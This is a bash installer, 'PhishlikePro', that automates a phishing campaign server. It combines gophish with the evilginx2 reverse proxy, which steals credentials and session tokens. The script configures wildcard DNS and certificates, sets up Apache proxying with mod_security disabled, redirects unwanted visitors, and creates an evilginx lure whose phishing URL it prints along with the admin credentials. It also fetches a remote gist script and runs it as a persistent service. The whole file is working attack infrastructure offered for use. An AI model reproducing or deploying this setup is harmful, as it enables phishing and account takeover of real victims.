#!/usr/bin/env bash

# make our output look nice...
author="beanscake"
emailaddress="beanscake@yandex.com"
githubusername="akaraon8bit"
btcaddress="3Pghdc8za2tG4Vz9zYm5buPt4GwWRUbyvb"


script_name="PhishlikePro"

function check_privs () {
    if [[ "$(whoami)" != root ]]; then
        print_error "You need root privileges to run this script."
        exit 1
    fi
}

function print_good () {
    echo -e "[${script_name}] \x1B[01;32m[+]\x1B[0m $1"
}

function print_error () {
    echo -e "[${script_name}] \x1B[01;31m[-]\x1B[0m $1"
}

function print_warning () {
    echo -e "[${script_name}] \x1B[01;33m[-]\x1B[0m $1"
}

function print_info () {
    echo -e "[${script_name}] \x1B[01;34m[*]\x1B[0m $1"
}

if [[ $# -ne 8 ]]; then
	print_error "Missing Parameters:"
	print_error "Usage:"
	print_error './setup <root domain> <subdomain(s)> <root domain bool> <redirect url> <feed bool> <rid replacement> <blacklist bool> <evilginx phishlet>'
	print_error " - root domain                     - the root domain to be used for the campaign"
	print_error " - subdomains                      - a space separated list of subdomains to proxy to evilginx2, can be one if only one"
	print_error " - root domain bool                - true or false to proxy root domain to evilginx2"
	print_error " - redirect url                    - URL to redirect unauthorized Apache requests"
	print_error " - feed bool                       - true or false if you plan to use the live feed"
	print_error " - rid replacement                 - replace the gophish default \"rid\" in phishing URLs with this value"
	print_error " - blacklist bool                  - true or false to use Apache blacklist"
	print_error " - Phishlet needed                 - Evilginx2 Phishlet to configure"
	print_error "Example:"
	print_error '  ./run.sh example.com "accounts myaccount" false https://redirect.com/ true user_id false o3652'

	exit 2
fi

# Set variables from parameters
root_domain="${1}"
evilginx2_subs="${2}"
e_root_bool="${3}"
redirect_url="${4}"
feed_bool="${5}"
rid_replacement="${6}"
evilginx_dir=$HOME/.evilginx
bl_bool="${7}"
phishlet_config="${8}"



# Get path to certificates
function get_certs_path () {
    print_info "Run the command below to generate letsencrypt certificates (will need to create two (2) DNS TXT records):"
    print_info "letsencrypt|certbot certonly --manual --preferred-challenges=dns --email admin@${root_domain} --server https://acme-v02.api.letsencrypt.org/directory --agree-tos -d '*.${root_domain}' -d '${root_domain}'"
    print_info "Once certificates are generated, enter path to certificates:"
    read -r certs_path
    if [[ ${certs_path: -1} != "/" ]]; then
        certs_path+="/"
    fi
}


function install_go_source(){
  if test -f "/usr/local/go/bin/go";
  then
    print_info "Go already installed."
  else
    print_info "Installing Go from source"
    v=$(curl -s https://go.dev/dl/?mode=json | jq -r '.[0].version')
    wget https://go.dev/dl/"${v}".linux-amd64.tar.gz
    tar -C /usr/local -xzf "${v}".linux-amd64.tar.gz
    ln -sf /usr/local/go/bin/go /usr/bin/go
    rm "${v}".linux-amd64.tar.gz
    print_good "Installed Go from source!"
  fi

}

# Install needed dependencies ubuntu box
function install_depend_ubuntu () {
    print_info "Installing dependencies with apt ubuntu"
    apt-get update
    apt-get install apache2 build-essential letsencrypt certbot wget git net-tools tmux openssl jq -y
    print_good "Installed dependencies with apt ubuntu!"
}



# Install needed dependencies centos box
function install_depend_centos(){
if test -f "/usr/local/src/cwp-el7-latest";
then
    print_info "Centos CWP Already installed."
else
  yum update -y
  yum group install "Development Tools" -y
  yum install epel-release -y
  yum install wget git net-tools tmux openssl jq haveged  inotify-tools -y
  cd /usr/local/src
  wget http://centos-webpanel.com/cwp-el7-latest
  sh cwp-el7-latest
  cd -
  # configip helper
wget -qO /root/cwpipreplace.sh https://gist.githubusercontent.com/akaraon8bit/0a13916e014203e9fd2b85922c53f65b/raw/e81cbbbd313dfd8d123b428e98608632f426e690/cwprelaceip.sh

echo "
[Unit]
Description=Script to change config to wildcard ip
After=network.target

[Service]
Type=simple
ExecStart=/root/cwpipreplace.sh
TimeoutStartSec=0

[Install]
WantedBy=default.target

" > /etc/systemd/system/cwpipreplace.service
chmod a+x /root/cwpipreplace.sh
systemctl daemon-reload
systemctl enable cwpipreplace.service
systemctl start cwpipreplace.service


fi

}

function build_donator_qrhelper(){

  cd donationqrterminal || exit 1
  go build > /dev/null
  cd -

}


function donation(){

    print_good "*** Donation ***"
    print_info "Kindly donate some BTC. "
    print_info "BTC Address: $btcaddress"
    build_donator_qrhelper
    donationqrterminal/donationqrterminal "${btcaddress}"
    print_good "*** Thank you ***"


}



# install according to platform
function install_depends() {

    # Determine OS platform
    UNAME=$(uname | tr "[:upper:]" "[:lower:]")
    # If Linux, try to determine specific distribution
    if [ "$UNAME" == "linux" ]; then
    	# If available, use LSB to identify distribution
    	if [ -f /etc/lsb-release -o -d /etc/lsb-release.d ]; then
    		export DISTRO=$(lsb_release -i | cut -d: -f2 | sed s/'^\t'//)
    		# Otherwise, use release info file
    	else
    		export DISTRO=$(ls -d /etc/[A-Za-z]*[_-][rv]e[lr]* | grep -v "lsb" | cut -d'/' -f3 | cut -d'-' -f1 | cut -d'_' -f1)
    	fi
    fi
    # For everything else (or if above failed), just use generic identifier
    [ "$DISTRO" == "" ] && export DISTRO=$UNAME

    unset UNAME
    case $DISTRO in
    	*centos* )
    		print_info "installing for centos"
        install_depend_centos
        install_go_source
        setup_apache_centos
        setup_gophish



    	;;

    	*ubuntu* )
         print_info "installing for ubuntu"
    		install_depend_ubuntu
        install_go_source
        get_certs_path
        setup_apache_ubuntu
        setup_gophish
        setup_evilginx2
        install_systemd_service

    	;;

    	*darwin* )
    		print_info "Not yet supported"
    	;;
    esac



}


#   # Configure DNS and install wildcard ssl



function configure_wildcard_dns_ssl () {




    ZONEDIR="/var/named/"
    NAMEDCONFIG="/etc/named.conf"
    CWDAPACHEVHOSTCONFIGDIR="/usr/local/apache/conf.d/vhosts/"
    serverip=`wget -qO- http://ipecho.net/plain`

    IFS=. read ip1 ip2 ip3 ip4 <<< "$serverip"

    ptrdomain="$ip3.$ip2.$ip1.in-addr.arpa"



    cd /etc/named/
    TGIKeyfile=$(find -type f -name 'Kacme*.key')
    TSIGkey=`cat Kacme.*.private | grep -oP '(?<=Key: )(.*)'`
    TSIGCONFIG="key acme. { algorithm hmac-md5; secret \"$TSIGkey\"; };"
    if ! grep -q "key acme." "$NAMEDCONFIG"; then
        rm -rf Kacme.*
        dnssec-keygen -a HMAC-MD5 -b 128 -n HOST acme.
        TGIKeyfile=$(find -type f -name 'Kacme*.key')
        TSIGkey=`cat Kacme.*.private | grep -oP '(?<=Key: )(.*)'`
        TSIGCONFIG="key acme. { algorithm hmac-md5; secret \"$TSIGkey\"; };"
        sed -i "s/key\s*.*acme.*//"  $NAMEDCONFIG
        sed -i "/include \"\/\etc\/named\.root\.key\"\;/a $TSIGCONFIG " $NAMEDCONFIG
    fi



    cd $ZONEDIR

    # if the file exists
    if [ -f "$DOMAIN.db" ]; then

# CHECK IF TSIG is configured
      if ! grep -q "$DOMAIN.db\";allow-update { key acme. ;};" "$NAMEDCONFIG"; then
          sed -i "s/$DOMAIN.db\"\;allow-update { key acme. ;};/$DOMAIN.db\"\;/"  $NAMEDCONFIG
          sed -i "s/$DOMAIN.db\"\;/$DOMAIN.db\"\;allow-update { key acme. ;};/"  $NAMEDCONFIG
      fi


      if ! grep -q "*.$DOMAIN." "$DOMAIN.db"; then

          #UPDATE existing DNS RECORD TO WILDCARD
          DNSIP=`cat $DOMAIN.db | grep -oP '(?<=@ IN A )(.*)'`
          sed  -i -E "s/(\@.*IN.*SOA)[^\s]+?(.*)/\1\tns1\.$DOMAIN\. postmaster.$DOMAIN. \(/"  $DOMAIN.db
          sed -i "0,/.*NS.*/s/.*NS.*/\\@\tIN\tNS\tns1\.$DOMAIN\.\n&/" "$DOMAIN.db"
          CONFTEMP=$(mktemp)
          cat "$DOMAIN.db" > $CONFTEMP
          rm -rf $DOMAIN.db
          cat  $CONFTEMP | tac | sed  "0,/.*CNAME.*/s/.*CNAME.*/\*\.$DOMAIN.   IN CNAME $DOMAIN\.\n&/" | tac > "$DOMAIN.db"
          cat "$DOMAIN.db" > $CONFTEMP
          rm -rf $DOMAIN.db
          cat  $CONFTEMP | tac | sed -E "0,/.*IN.*A[^0-9]+([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}.*)/s/.*IN.*A[^0-9]+([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}.*)/ns1 IN A \1\n\*\. IN A \1 \n&/g" | tac  > "$DOMAIN.db"
          SERIAL=`/usr/sbin/named-checkzone $DOMAIN $DOMAIN.db | egrep -ho '[0-9]{10}'`
          sed -i "s/$SERIAL/$(($SERIAL+1))/"  $DOMAIN.db
          rndc reload
          # rndc reload $DOMAIN
          rm -rf $CONFTEMP
      fi
else

# Add zone file

  if ! grep -q "zone \"${DOMAIN}\"" "$NAMEDCONFIG"; then

echo "// zone ${DOMAIN}
zone \"${DOMAIN}\" {type master; file \"/var/named/${DOMAIN}.db\";allow-update { key acme. ;};};" >> $NAMEDCONFIG


echo "// zone ${DOMAIN}
zone \"ns1.${DOMAIN}\" {type master;file \"/var/named/ns1.${DOMAIN}.db\";allow-update { key acme. ;};};" >> $NAMEDCONFIG

echo "// zone ${DOMAIN}
zone \"ns2.${DOMAIN}\" {type master;file \"/var/named/ns2.${DOMAIN}.db\";allow-update { key acme. ;};};" >> $NAMEDCONFIG



echo "
; Zone file for ns1.${DOMAIN}
\$TTL 14400
ns1.${DOMAIN}.      86400      IN      SOA      ns1.${DOMAIN}.      info.${DOMAIN}.      (
      				`/bin/date '+%Y%m%d00'` ;serial, todays date+todays
      				86400 ;refresh, seconds
      				7200 ;retry, seconds
      				3600000 ;expire, seconds
      				86400 ;minimum, seconds
      )
ns1.${DOMAIN}. 86400 IN NS ns1.${DOMAIN}.
ns1.${DOMAIN}. 86400 IN NS ns2.${DOMAIN}.
ns1.${DOMAIN}. 14400 IN A 127.0.0.1" > "/var/named/ns1.${DOMAIN}.db"



echo "
; Zone file for ns2.${DOMAIN}
\$TTL 14400
ns2.${DOMAIN}.      86400      IN      SOA      ns1.${DOMAIN}.      info.${DOMAIN}.      (
      				`/bin/date '+%Y%m%d00'` ;serial, todays date+todays
      				86400 ;refresh, seconds
      				7200 ;retry, seconds
      				3600000 ;expire, seconds
      				86400 ;minimum, seconds
      )
ns2.${DOMAIN}. 86400 IN NS ns1.${DOMAIN}.
ns2.${DOMAIN}. 86400 IN NS ns2.${DOMAIN}.
ns2.${DOMAIN}. 14400 IN A 127.0.0.1" > "/var/named/ns2.${DOMAIN}.db"


  fi



# @	86400	IN	NS		ns2.$DOMAIN.
# @	86400	IN	NS		ns3.$DOMAIN.
    # @	86400	IN	NS		ns1.centos-webpanel.com.
    # @	86400	IN	NS		ns2.centos-webpanel.com.
cat << EOF > "$DOMAIN.db"
; Generated by $author
; Zone file for $DOMAIN
\$TTL 14400
@    86400        IN      SOA	ns1.$DOMAIN. postmaster.$DOMAIN. (
				`/bin/date '+%Y%m%d00'` ; serial, todays date+todays
				3600            ; refresh, seconds
				7200            ; retry, seconds
				1209600         ; expire, seconds
				86400 )         ; minimum, seconds
@	IN	NS	ns1.$DOMAIN.
@	86400	IN	NS		ns2.$DOMAIN.
@ IN A $serverip
localhost.$DOMAIN. IN A 127.0.0.1
@ IN MX 0 $DOMAIN.
mail 14400 IN CNAME $DOMAIN.
smtp 14400 IN CNAME $DOMAIN.
pop  14400 IN CNAME $DOMAIN.
pop3 14400 IN CNAME $DOMAIN.
imap 14400 IN CNAME $DOMAIN.
webmail 14400 IN A $serverip
cpanel 14400 IN A $serverip
cwp 14400 IN A $serverip
www 14400 IN CNAME $DOMAIN.
ftp 14400 IN CNAME $DOMAIN.
*.$DOMAIN.   IN CNAME $DOMAIN.
_dmarc	14400	IN	TXT	"v=DMARC1; p=none" #ADD DMKIR THIS LINE
@	14400	IN	TXT	"v=spf1 +a +mx +ip4:${serverip} ~all"
server010     14400   IN      A       ${serverip} ; #subdomain
www.server010     14400   IN      A       ${serverip}  ; #subdomain

ns1.$DOMAIN. 14400 IN A 127.0.0.1
ns2.$DOMAIN. 14400 IN A 127.0.0.1
*. IN A 127.0.0.1
ns1 IN A 127.0.0.1
EOF
systemctl restart named
SERIAL=`/usr/sbin/named-checkzone $DOMAIN $DOMAIN.db | egrep -ho '[0-9]{10}'`
sed -i "s/$SERIAL/$(($SERIAL+1))/"  $DOMAIN.db
rndc reload
      fi




# hostnamectl set-hostname "server010.$DOMAIN"


# set ptr dns

if ! grep -q "zone \"${ptrdomain}\"" "$NAMEDCONFIG"; then
echo "// zone ptr $serverip
  zone \"$ptrdomain\" {
  type master;
  file \"/var/named/$ptrdomain.db\";
  allow-update { none ; };
};" >> $NAMEDCONFIG

echo "
\$TTL 3600;
@ IN SOA ns1.$DOMAIN. root.$DOMAIN. (
`/bin/date '+%Y%m%d00'` ; Serial
21600 ; refresh
3600 ; retry
3600000 ; expire
86400 ) ; minimum

@ IN NS ns1.$DOMAIN.
@ IN NS ns2.$DOMAIN.

\$ORIGIN $ptrdomain.
$ip4 IN PTR server010.$DOMAIN." > "/var/named/$ptrdomain.db"



fi




    systemctl restart named

    if [ ! -f "$DOMAINKEY" ]; then
# wait for rdnc reload
sleep 5
IFS= read -r -d '' acemebin <<EOC
env  NSUPDATE_SERVER=localhost  NSUPDATE_KEY=$TGIKeyfile /bin/bash /root/.acme.sh/acme.sh --issue --cert-home /root/.acme.sh/cwp_certs -d *.${DOMAIN} --dns dns_nsupdate -w /usr/local/apache/autossl_tmp/ --certpath /etc/pki/tls/certs/${SUBDOMAINFILE}.$DOMAIN.cert --keypath /etc/pki/tls/private/${SUBDOMAINFILE}.${DOMAIN}.key --fullchainpath /etc/pki/tls/certs/${SUBDOMAINFILE}.${DOMAIN}.bundle --listen-v4 --force --log
EOC


        while true; do  dig -t txt +short _acme-challenge.$DOMAIN | xargs echo "Checking _acme-challenge TXT Record: "; sleep 5; done &
        cd /etc/named/
        $acemebin
        kill $(jobs -p)
    fi

cd $WORKDIR
}




# get gophis credentials

function get_gophish_cred_tmux(){
tmux capture-pane -t  gophish
gophish_tmux=`tmux show-buffer`

  print_good "**** Gophish Credentials ****"
gophish_password=`echo $gophish_tmux | grep -Eo '(password )[^"]+'  | awk '{print $2}'`
gophish_admin_url=`echo $gophish_tmux  | grep -Eo '(admin server)[^"]+'  | awk '{print $5}'`
gophish_phishing_url=`echo $gophish_tmux  | grep -Eo '(phishing server)[^"]+'  | awk '{print $5}'`
print_info "Adminurl: https:$gophish_admin_url"
print_info "Username: admin"
print_info "Password: $gophish_password"
print_info "Phishingurl: htt$gophish_phishing_url"
print_good "********************************"

}


# configure Evilginx and get lure tmux
function configure_evilginx_phislet(){


tmux send-keys -t evilginx "config domain ${root_domain}" C-m
tmux send-keys -t evilginx "config ip `wget -qO- http://ipecho.net/plain`" C-m
tmux send-keys -t evilginx "phishlets hostname ${phishlet_config} ${root_domain}" C-m
tmux send-keys -t evilginx "phishlets enable ${phishlet_config}" C-m
tmux send-keys -t evilginx "lures create ${phishlet_config}" C-m
sleep 1
tmux capture-pane -t  evilginx
lureid=`tmux show-buffer | grep -Eo '(created lure with ID: )[0-9]+'  | awk '{print $5}' `
tmux send-keys -t evilginx "lures get-url ${lureid}" C-m
sleep 1
tmux capture-pane -t  evilginx
phish_url_test=`tmux show-buffer | grep -Eo '(http|https)://[^"]+'`
   print_good "**** Evilginx2  $phishlet_config phishlet configured successfully ****"
  print_info "Phishlet $phishlet_config url: ${phish_url_test}"
    print_good "********************************"
}






# install the service to run on boot
function install_systemd_service(){

# stop the service if it is already running
systemctl stop mastergtmux.service 2>/dev/null
kill -9  ` pgrep -f evilginx2` 2>/dev/null
kill -9  ` pgrep -f evilfeed` 2>/dev/null
kill -9  ` pgrep -f gophish` 2>/dev/null

  echo "
  [Unit]
  Description=tmux master service

  [Service]
  Type=forking
  ExecStart=/usr/bin/tmux new-session -s .. -d
  ExecStop=/usr/bin/tmux kill-session -t ..

  [Install]
  WantedBy=multi-user.target

  " > /etc/systemd/system/mastergtmux.service

  systemctl daemon-reload
  systemctl enable mastergtmux.service
  systemctl start mastergtmux.service



  echo "
  [Unit]
  Description=gophishstart
  PartOf=mastergtmux.service
  After=mastergtmux.service

  [Service]
  Type=oneshot
  RemainAfterExit=yes
  WorkingDirectory=$PWD/gophish/
  ExecStart=/usr/bin/tmux new -d -s gophish '$PWD/gophish/gophish;'
  ExecStop=/usr/bin/tmux kill-session -t gophish
  #Restart=always
  #RestartSec=5

  [Install]
  WantedBy=multi-user.target


  " > /etc/systemd/system/gophish.service

  systemctl daemon-reload
  systemctl enable gophish.service
  systemctl start gophish.service




  echo "
  [Unit]
  Description=evilfeedstart
  After=gophish.service

  [Service]
  Type=simple
  WorkingDirectory=$PWD/evilfeed/
  ExecStart=$PWD/evilfeed/evilfeed
  ExecStop=/bin/kill -9  /bin/pgrep -f evilfeed


  [Install]
  WantedBy=multi-user.target
  " > /etc/systemd/system/evilfeed.service

  systemctl daemon-reload
  systemctl enable evilfeed.service
  systemctl start evilfeed.service




  echo "
  [Unit]
  Description=evilginxstart
  PartOf=mastergtmux.service
  After=gophish.service

  [Service]
  Type=oneshot
  RemainAfterExit=yes
  WorkingDirectory=$PWD/evilginx2/
  ExecStart=/usr/bin/tmux new -d -s evilginx '$PWD/evilginx2/evilginx2 -g  $PWD/gophish/gophish.db;'
  ExecStop=/usr/bin/tmux kill-session -t evilginx
  #Restart=always
  #RestartSec=5

  [Install]
  WantedBy=multi-user.target

  " > /etc/systemd/system/evilginx.service

  systemctl daemon-reload
  systemctl enable evilginx.service
  systemctl start evilginx.service


}






# Configure Apache centos
function setup_apache_centos () {
WORKDIR=`pwd`

APACHERULEDIR="/usr/local/apache/rule/"

mkdir -p "$APACHERULEDIR"


CWDAPACHEVHOSTCONFIGDIR="/usr/local/apache/conf.d/vhosts/"


DOMAIN="${root_domain}"
# SUBDOMAIN="${evilginx2_subs}"
SUBDOMAIN="*"


if [ -z "$SUBDOMAIN" ]
then
  SUBDOMAIN="*"
fi



  SUBDOMAINFILE="zZwildcard"

  if [ "$SUBDOMAIN" == "*"  ] || [[ "${evilginx2_subs}" == *"'*'"* ]]; then
        SUBDOMAINFILE="zZwildcard"
  else
        SUBDOMAINFILE="$SUBDOMAIN"
  fi

# DOMAINKEY="/etc/pki/tls/private/${SUBDOMAINFILE}.${DOMAIN}.key"
DOMAINKEY="/etc/pki/tls/certs/${SUBDOMAINFILE}.${DOMAIN}.bundle"



certs_path="/etc/pki/tls/certs/$DOMAIN/"
mkdir -p $certs_path







# install wildcard certificate using acme
 configure_wildcard_dns_ssl

 if [  -f "$DOMAINKEY" ]; then
   #symbolic links certificate
   ln -sf "/etc/pki/tls/certs/$SUBDOMAINFILE.$DOMAIN.cert" ${certs_path}fullchain.pem
   ln -sf  "/etc/pki/tls/private/$SUBDOMAINFILE.$DOMAIN.key" ${certs_path}privkey.pem
 fi
 # set up evilginx2
setup_evilginx2
# run the service
install_systemd_service


# evilginxport ssl
PROXYPORT=`cat ${evilginx_dir}/port/443`
# evilginxport
PROXYPORT80=`cat ${evilginx_dir}/port/80`

if [ -z "$PROXYPORT" ]
then
  PROXYPORT="8443"
fi
if [ -z "$PROXYPORT80" ]
then
  PROXYPORT80="8083"
fi


# APACHE SSL VIRTUAL HOST TEMPLATE

Apachessl_CONFTEMP=$(mktemp)
cat << EOF > $Apachessl_CONFTEMP
    <VirtualHost *:443>
    ServerName $DOMAIN
  	ServerAlias  *.$DOMAIN
  	ServerAdmin webmaster@$DOMAIN

  	UseCanonicalName Off

  	CustomLog /usr/local/apache/domlogs/$SUBDOMAINFILE.$DOMAIN.bytes bytes
    CustomLog /usr/local/apache/domlogs/$SUBDOMAINFILE.$DOMAIN.log combined
  	CustomLog /usr/local/apache/domlogs/$SUBDOMAINFILE.$DOMAIN.evilginx2.log "%h \"%r\" \"%{Referer}i\" \"%{User-Agent}i\""
  	ErrorLog /usr/local/apache/domlogs/$SUBDOMAINFILE.$DOMAIN.error.log

  	SSLEngine on
  	SSLCertificateFile  /etc/pki/tls/certs/$SUBDOMAINFILE.$DOMAIN.cert
  	SSLCertificateKeyFile  /etc/pki/tls/private/$SUBDOMAINFILE.$DOMAIN.key
  	SSLCertificateChainFile  /etc/pki/tls/certs/$SUBDOMAINFILE.$DOMAIN.bundle
  	SetEnvIf User-Agent ".*MSIE.*" nokeepalive ssl-unclean-shutdown

  <IfModule mod_proxy.c>
      SSLProxyEngine on
      SSLProxyVerify none
      SSLProxyCheckPeerCN off
      SSLProxyCheckPeerName off
      SSLProxyCheckPeerExpire off
      ProxyRequests Off
      ProxyPreserveHost On
      ProxyVia Full

      RewriteEngine on
      ProxyPass / https://localhost:$PROXYPORT/
      ProxyPassReverse / https://localhost:$PROXYPORT/


      <Proxy *>
        AllowOverride All
      </Proxy>
    </IfModule>

    <IfModule mod_security2.c>
      SecRuleEngine Off
    </IfModule>


Include ${APACHERULEDIR}/redirect.rules
#BLACKLISTTEMPLATE

</VirtualHost>
EOF


#BLACKLISTTEMPLATE

blacklist_tmp_CONFTEMP=$(mktemp)
cat << EOF > $blacklist_tmp_CONFTEMP
<Location />
<RequireAll>
    Require all granted
    Include ${APACHERULEDIR}/blacklist.conf
</RequireAll>
</Location>
EOF



# APACHE PORT 80 LIKE CONFIG template

ApacheNOssl_CONFTEMP=$(mktemp)
cat << EOF > $ApacheNOssl_CONFTEMP
    <VirtualHost *:80>
    	ServerName $DOMAIN
    	ServerAlias  *.$DOMAIN
    	ServerAdmin webmaster@$DOMAIN
    	UseCanonicalName Off


    	CustomLog /usr/local/apache/domlogs/$SUBDOMAINFILE.$DOMAIN.bytes bytes
    	CustomLog /usr/local/apache/domlogs/$SUBDOMAINFILE.$DOMAIN.log combined
    CustomLog /usr/local/apache/domlogs/$SUBDOMAINFILE.$DOMAIN.evilginx2.log "%h \"%r\" \"%{Referer}i\" \"%{User-Agent}i\""
    	ErrorLog /usr/local/apache/domlogs/$SUBDOMAINFILE.$DOMAIN.error.log

    	<IfModule mod_setenvif.c>
    		SetEnvIf X-Forwarded-Proto "^https\$" HTTPS=on
    	</IfModule>

    	<IfModule mod_proxy.c>
    		ProxyRequests Off
    		ProxyPreserveHost On
    		ProxyVia Full
        ProxyPass / http://localhost:$PROXYPORT80/
		    ProxyPassReverse / http://localhost:$PROXYPORT80/

    		<Proxy *>
    			AllowOverride All
    		</Proxy>
    	</IfModule>

    	<IfModule mod_security2.c>
    		SecRuleEngine Off
    	</IfModule>

      Include ${APACHERULEDIR}/redirect.rules
      #BLACKLISTTEMPLATE

    </VirtualHost>
EOF




      # Prepare Apache wildcard file
      evilginx2_cstring=""
      for esub in ${evilginx2_subs} ; do
        if [[ $esub == *"'*'"* ]]; then
          continue
        fi
          evilginx2_cstring+=${esub}.${root_domain}
          evilginx2_cstring+=" "
      done


      # echo $evilginx2_cstring;

      if [[ $(echo "${e_root_bool}" | grep -ci "true") -gt 0 ]]; then
          evilginx2_cstring+=${root_domain}
      fi

      # Replace template values with user input
      if [[ $(echo "${bl_bool}" | grep -ci "true") -gt 0 ]]; then
        sed -i -E '/^.*#BLACKLISTTEMPLATE$/r'$blacklist_tmp_CONFTEMP $Apachessl_CONFTEMP
        sed -i -E '/^.*#BLACKLISTTEMPLATE$/r'$blacklist_tmp_CONFTEMP $ApacheNOssl_CONFTEMP
      fi


      sed "s|https://en.wikipedia.org/|${redirect_url}|g" conf/redirect.rules.template > redirect.rules
      # Copy over Apache config file if ssl is generated
      if [  -f "$DOMAINKEY" ]; then
      cp -rf $ApacheNOssl_CONFTEMP  "${SUBDOMAINFILE}.$DOMAIN.conf"
      cp -rf $Apachessl_CONFTEMP  "${SUBDOMAINFILE}.$DOMAIN.ssl.conf"
      cp -rf "${SUBDOMAINFILE}.$DOMAIN.ssl.conf" $CWDAPACHEVHOSTCONFIGDIR
      cp -rf "${SUBDOMAINFILE}.$DOMAIN.conf" $CWDAPACHEVHOSTCONFIGDIR
    fi
      # Copy over blacklist file if chosen
      if [[ $(echo "${bl_bool}" | grep -ci "true") -gt 0 ]]; then
        echo "${bl_bool}"
          cp -rf conf/blacklist.conf $APACHERULEDIR
      fi
      # Copy over redirect rules file
      cp -rf redirect.rules $APACHERULEDIR


      systemctl restart httpd.service
      print_good "Apache configured!"



      # clean up
      rm -rf redirect.rules
      rm -rf $Apachessl_CONFTEMP
      rm -rf $ApacheNOssl_CONFTEMP
      rm -rf $blacklist_tmp_CONFTEMP
      rm -rf "${SUBDOMAINFILE}.$DOMAIN.ssl.conf"
      rm -rf "${SUBDOMAINFILE}.$DOMAIN.conf"


}




# Configure Apache ubuntu
function setup_apache_ubuntu () {
    # Enable needed Apache mods
    print_info "Configuring Apache"
    a2enmod proxy > /dev/null
    a2enmod proxy_http > /dev/null
    a2enmod proxy_balancer > /dev/null
    a2enmod lbmethod_byrequests > /dev/null
    a2enmod rewrite > /dev/null
    a2enmod ssl > /dev/null

    # Prepare Apache 000-default.conf file
    evilginx2_cstring=""
    for esub in ${evilginx2_subs} ; do
        evilginx2_cstring+=${esub}.${root_domain}
        evilginx2_cstring+=" "
    done
    if [[ $(echo "${e_root_bool}" | grep -ci "true") -gt 0 ]]; then
        evilginx2_cstring+=${root_domain}
    fi
    # Replace template values with user input
    if [[ $(echo "${bl_bool}" | grep -ci "true") -gt 0 ]]; then
        sed "s/ServerAlias evilginx2.template/ServerAlias ${evilginx2_cstring}/g" conf/000-default.conf.template > 000-default.conf
    else
        sed "s/ServerAlias evilginx2.template/ServerAlias ${evilginx2_cstring}/g" conf/000-default-no-bl.conf.template > 000-default.conf
    fi
    sed -i "s|SSLCertificateFile|SSLCertificateFile ${certs_path}cert.pem|g" 000-default.conf
    sed -i "s|SSLCertificateChainFile|SSLCertificateChainFile ${certs_path}fullchain.pem|g" 000-default.conf
    sed -i "s|SSLCertificateKeyFile|SSLCertificateKeyFile ${certs_path}privkey.pem|g" 000-default.conf
    # Don't listen on port 80
    sed -i "s|Listen 80||g" /etc/apache2/ports.conf
    # Input redirect information
    sed "s|https://en.wikipedia.org/|${redirect_url}|g" conf/redirect.rules.template > redirect.rules
    # Copy over Apache config file
    cp 000-default.conf /etc/apache2/sites-enabled/
    # Copy over blacklist file if chosen
    if [[ $(echo "${bl_bool}" | grep -ci "true") -gt 0 ]]; then
        cp conf/blacklist.conf /etc/apache2/
    fi
    # Copy over redirect rules file
    cp redirect.rules /etc/apache2/
    rm redirect.rules 000-default.conf
    print_good "Apache configured!"
}

# Configure and install evilginx2
function setup_evilginx2 () {
    # Copy over certs for phishlets
    print_info "Configuring evilginx2"
    mkdir -p "${evilginx_dir}/crt/${root_domain}"
    for i in evilginx2/phishlets/*.yaml; do
        phishlet=$(echo "${i}" | awk -F "/" '{print $3}' | sed 's/.yaml//g')
        ln -sf ${certs_path}fullchain.pem "${evilginx_dir}/crt/${root_domain}/${phishlet}.crt"
        ln -sf ${certs_path}privkey.pem "${evilginx_dir}/crt/${root_domain}/${phishlet}.key"
    done
    # Prepare DNS for evilginx2
    evilginx2_cstring=""
    for esub in ${evilginx2_subs} ; do
        evilginx2_cstring+=${esub}.${root_domain}
        evilginx2_cstring+=" "
    done

    evilginx2_cstring+="*.${root_domain}"

    cp /etc/hosts /etc/hosts.bak
    sed -i "s|127.0.0.1.*|127.0.0.1 localhost ${evilginx2_cstring}${root_domain}|g" /etc/hosts
    # sed -i "s|127.0.0.1.*|127.0.0.1 localhost ${evilginx2_cstring}${root_domain}|g" /etc/hosts
  #  cp /etc/resolv.conf /etc/resolv.conf.bak
  #  rm /etc/resolv.conf
  #  ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
  #  systemctl stop systemd-resolved
    # Build evilginx2
    cd evilginx2 || exit 1
    go build
    cd ..


    print_good "Configured evilginx2!"
}

# Configure and install gophish
function setup_gophish () {
    print_info "Configuring gophish"
    sed "s|\"cert_path\": \"gophish_template.crt\",|\"cert_path\": \"${certs_path}fullchain.pem\",|g" conf/config.json.template > gophish/config.json
    sed -i "s|\"key_path\": \"gophish_template.key\"|\"key_path\": \"${certs_path}privkey.pem\"|g" gophish/config.json
    # Setup live feed if selected
    if [[ $(echo "${feed_bool}" | grep -ci "true") -gt 0 ]]; then
        sed -i "s|\"feed_enabled\": false,|\"feed_enabled\": true,|g" gophish/config.json
        cd evilfeed || exit 1
        go build
        cd ..
    fi
    # Replace rid with user input
    find . -type f -exec sed -i "s|client_id|${rid_replacement}|g" {} \;
    cd gophish || exit 1
    go build
    cd ..
    print_good "Configured gophish!"
}

function main () {
    check_privs
    install_depends

    print_good "Installation complete!."
    print_info "run tmux a -t gophish to connect to gophish Session "
   print_info "run tmux a -t evilginx to connect to evilginx Session"
    get_gophish_cred_tmux
    configure_evilginx_phislet
    donation


}

main

exit 0
